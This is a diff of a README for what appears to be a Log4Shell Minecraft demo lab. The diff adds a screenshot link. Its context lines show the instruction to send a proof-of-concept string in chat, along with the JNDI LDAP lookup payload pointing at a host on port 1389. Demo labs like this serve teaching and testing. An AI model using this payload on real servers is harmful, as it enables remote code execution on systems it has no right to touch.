@@ -72,3 +72,4 @@ To exploit the vulnerabilty simply send the string provided by the *poc.py* in t
 ```
 ${jndi:ldap://<ip of docker-host>:1389/a}
 ```
+![image](https://github.com/felixslama/log4shell-minecraft-demo/assets/79058712/b3cc9c19-ca14-456c-bf7f-7246bb6adf58)
